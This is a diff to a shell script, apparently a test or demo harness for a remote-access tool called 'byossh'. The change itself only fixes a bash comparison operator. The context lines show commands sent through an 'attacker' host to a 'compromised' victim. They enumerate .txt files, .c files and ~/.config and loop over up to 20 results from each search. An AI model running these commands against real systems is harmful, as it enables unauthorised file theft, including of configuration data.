@@ -61,7 +61,7 @@ sleep 5 # let the victim connect
     output=$(ssh attacker "byossh compromised 'find / | grep .txt$'" | sed '1d')
     for file in $output; do
         # Stop after 20 files for the sake of time
-        if [ "$total" == "20" ]; then
+        if [ "$total" = "20" ]; then
             break
         fi
         total=$(($total + 1))
@@ -91,7 +91,7 @@ sleep 5 # let the victim connect
     output=$(ssh attacker "byossh compromised 'find / | grep \'\\.c$\''" | sed '1d')
     for file in $output; do
         # Stop after 20 files for the sake of time
-        if [ "$total" == "20" ]; then
+        if [ "$total" = "20" ]; then
             break
         fi
         total=$(($total + 1))
@@ -105,7 +105,7 @@ sleep 5 # let the victim connect
     output=$(ssh attacker "byossh compromised find ~/.config" | sed '1d')
     for file in $output; do
         # Stop after 20 files for the sake of time
-        if [ "$total" == "20" ]; then
+        if [ "$total" = "20" ]; then
             break
         fi
         total=$(($total + 1))
